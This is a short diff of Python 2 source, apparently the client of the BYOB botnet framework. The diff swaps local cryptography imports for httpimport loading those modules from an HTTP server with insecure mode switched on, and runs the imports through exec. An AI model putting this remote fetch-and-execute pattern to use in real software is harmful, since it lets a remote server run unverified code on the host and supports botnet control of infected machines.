@@ -17,17 +17,25 @@ import _winreg
 import threading
 import cStringIO
 import collections
-import Crypto.Util
-import Crypto.Hash.HMAC
-import Crypto.Cipher.AES
-import Crypto.Hash.SHA256
-import Crypto.PublicKey.RSA
-import Crypto.Cipher.PKCS1_OAEP
+
+
+# remote imports
+
+import httpimport
+
+httpimport.INSECURE = True
+
+with httpimport.remote_repo(['Crypto','Crypto.Util','Crypto.Cipher.AES','Crypto.Hash.HMAC','Crypto.Hash.MD5','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP'], base_url='http://localhost:8000'):
+    for module in ['Crypto','Crypto.Util','Crypto.Cipher.AES','Crypto.Hash.HMAC','Crypto.Hash.MD5','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']:
+        try:
+            exec "import %s" % module
+        except ImportError:
+            print("Error: unable to import '%s'" % module)
 
 # byob
 import util
 
-
+            
 jobs    = Queue.Queue()
 workers = collections.OrderedDict()
 
